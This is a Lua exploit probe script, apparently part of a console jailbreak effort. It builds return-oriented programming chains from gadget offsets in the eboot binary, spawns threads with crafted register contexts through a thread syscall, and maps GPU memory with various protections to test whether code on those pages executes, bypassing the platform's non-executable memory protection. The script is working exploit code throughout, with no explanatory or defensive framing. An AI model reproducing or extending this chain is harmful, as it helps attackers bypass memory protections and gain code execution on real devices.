-- CRASH_CLASS: HIGH
-- PROBE 940a: is a GPU mapping executable?
--
-- 98a section A showed GPU pages carry extra VM flag bits 0x30 that heap pages do not
-- (0x61002000000033 vs 0x61002000000003). Everything userland-mapped so far has been NX
-- (928b/928c/934a: a thread entering a code page dumps the context and kills the process).
-- This asks the one remaining question: does a GPU aperture mapping execute?
--
-- Control first (entry = fcall stub, 910a chain, must return pid), then entry = GPU page.
print("=== PROBE 940a: GPU exec page ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then
        local ok, n = pcall(function() return v:tonumber() end)
        if ok and n then return n end
    end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(a) local ok, v = pcall(function() return memory.read_dword(a) end); if ok then return to_num(v) end return nil end
local function safe_wd(a, v) return (pcall(function() memory.write_dword(a, v) end)) end
local function safe_wq(a, v) return (pcall(function() memory.write_qword(a, v) end)) end
local function fmt(v) local h, l = 0, to_num(v); if type(v) == "table" and v.h then h, l = v.h, v.l end; return string.format("0x%X%08X", h, l) end

local sc_mmap = make_syscall(477)
local sc_thr  = make_syscall(430)

-- gadgets proven by 937a
local eboot = 0x591D8000
local pop_rdi = eboot + 0xA1DFE
local pop_rax = eboot + 0x18992
local store   = eboot + 0xA6C67
local jmp_g   = eboot + 0x2A1A0
local fn = nil
do
    local p = tostring(syscall.pipe)
    local s = p:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
    if s then fn = tonumber(s:sub(3), 16) end
end
print("[0] fn=" .. tostring(fn and string.format("0x%X", fn) or "nil"))

local PAGE = 0x4000
local function spawn(entry, rsp, rdi, rax)
    local out = memory.alloc(8)
    safe_wq(out, 0)
    local ctx = memory.alloc(0x140)
    for i = 0, 0x13C, 8 do safe_wq(ctx + i, 0) end
    safe_wd(ctx + 0x0C0, 0x43)      -- CS
    safe_wd(ctx + 0x100, 0x3B)      -- SS
    safe_wq(ctx + 0x0E0, entry)     -- RIP
    safe_wq(ctx + 0x0F8, rsp)       -- RSP
    safe_wq(ctx + 0x108, 0x480)     -- gate magic
    safe_wq(ctx + 0x110, 0x10000)   -- gate type
    safe_wq(ctx + 0x0D0, 0x0)       -- flags <= 7
    safe_wq(ctx + 0x048, rdi)       -- RDI
    safe_wq(ctx + 0x078, rax)       -- RAX
    local ok, rv = pcall(function() return sc_thr(uint64(ctx), uint64(0)) end)
    return ok, rv, out
end

-- control: entry = fn, chain on stack (out is allocated FIRST: a chain whose pop_rdi
-- yields 0 makes the store gadget write to NULL and kills the process - the 940a v1 bug)
local PAGE = 0x4000
local function ctx_make(entry, rsp, rdi, rax)
    local ctx = memory.alloc(0x140)
    for i = 0, 0x13C, 8 do safe_wq(ctx + i, 0) end
    safe_wd(ctx + 0x0C0, 0x43)
    safe_wd(ctx + 0x100, 0x3B)
    safe_wq(ctx + 0x0E0, entry)
    safe_wq(ctx + 0x0F8, rsp)
    safe_wq(ctx + 0x108, 0x480)
    safe_wq(ctx + 0x110, 0x10000)
    safe_wq(ctx + 0x0D0, 0x0)
    safe_wq(ctx + 0x048, rdi)
    safe_wq(ctx + 0x078, rax)
    return ctx
end

local protections = { 7, 5, 0x33 }
for _, prot in ipairs(protections) do
    local ok, gpu = pcall(function()
        return sc_mmap(uint64(0), uint64(PAGE * 4), uint64(prot), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    local base = ok and to_num(gpu) or 0
    if base == 0 or base == 0xFFFFFFFFFFFFFFFF then
        print(string.format("[P] prot=0x%X mmap FAIL", prot))
    else
        print(string.format("[P] prot=0x%X base=0x%X", prot, base))
        local out = memory.alloc(8)
        safe_wq(out, 0)
        local stack = base + PAGE * 3
        local c = { pop_rdi, out, pop_rax, 20, fn, store, pop_rdi, 0, pop_rax, 431, fn, jmp_g }
        for i, v in ipairs(c) do safe_wq(stack + (i - 1) * 8, v) end

        local okc, rvc = pcall(function() return sc_thr(uint64(ctx_make(fn, stack, 0, 20)), uint64(0)) end)
        local pid = safe_rd(out)
        print(string.format("[C] control ok=%s rv=%s out=%s", tostring(okc), fmt(rvc or 0), tostring(pid)))
        if okc and to_num(rvc) == 0 and pid and pid ~= 0 then
            -- entry = our GPU page holding 0xC3; the ret falls straight into the same chain
            safe_wd(base, 0xC3)
            safe_wq(out, 0)
            local c2 = { pop_rdi, out, pop_rax, 20, fn, store, pop_rdi, 0, pop_rax, 431, fn, jmp_g }
            for i, v in ipairs(c2) do safe_wq(stack + (i - 1) * 8, v) end
            local okx, rvx = pcall(function() return sc_thr(uint64(ctx_make(base, stack, 0, 0)), uint64(0)) end)
            local got = safe_rd(out)
            print(string.format("[X] entry=0x%X ok=%s rv=%s out=%s", base, tostring(okx), fmt(rvx or 0), tostring(got)))
            if got and got ~= 0 then print("[X] EXECUTED GPU PAGE") end
        end
        break
    end
end
print("[Z] DONE")
